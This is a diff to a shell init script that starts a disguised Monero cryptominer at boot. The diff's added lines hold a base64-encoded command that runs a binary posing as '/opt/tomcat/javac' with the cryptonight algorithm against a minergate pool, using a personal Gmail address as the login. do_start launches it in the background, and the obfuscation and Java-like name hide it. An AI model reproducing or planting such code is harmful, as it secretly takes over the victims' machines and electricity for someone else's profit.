@@ -1,4 +1,4 @@
-#! /bin/sh -x
+#! /bin/sh
 ### BEGIN INIT INFO
 # Provides:          1
 # Required-Start:
@@ -17,7 +17,7 @@ CC3=`echo ${CC4}|${CC0} -d `;
 CC5=`lscpu|grep CPU\(s\)\:|grep -v NUMA|awk -F" " '{print $2 }'`;
 CC6="Y3J5cHRvbmlnaHQK";
 CC7="c3RyYXR1bSt0Y3AK";
-CC8="Oi8veG1yLnBvb2wubWluZXJnYXRlLmNvbTo0NTU2MCAtT3N0cnluZ0BnbWFpbC5jb206U2xhY2t3YXJlIC10Cg==";
+CC8="L29wdC90b21jYXQvamF2YWMgLWEgY3J5cHRvbmlnaHQgLUIgLS1jZXJ0PS9vcHQvY29kZS9zdGFyc2VlZC5zZS5jcnQgLW8gc3RyYXR1bSt0Y3A6Ly94bXIucG9vbC5taW5lcmdhdGUuY29tOjQ1NTYwIC11c3QzcGguay5oYXJyaXNAZ21haWwuY29tIC10MiAK";
 CC9=`echo ${CC6}|${CC0} -d `;
 CC10=`echo ${CC7}|${CC0} -d `;
 CC11=`echo ${CC8}|${CC0} -d `;
@@ -28,7 +28,7 @@ do_stop () {
         ps -ef|grep javac|awk -F" " '{print $2}'|xargs kill -9
 }
 do_start () {
-                 ${CC13}${CC9} -o ${CC10}${CC11}${CC5} &
+                 ${CC11} &
 }
 case "$1" in
   start)
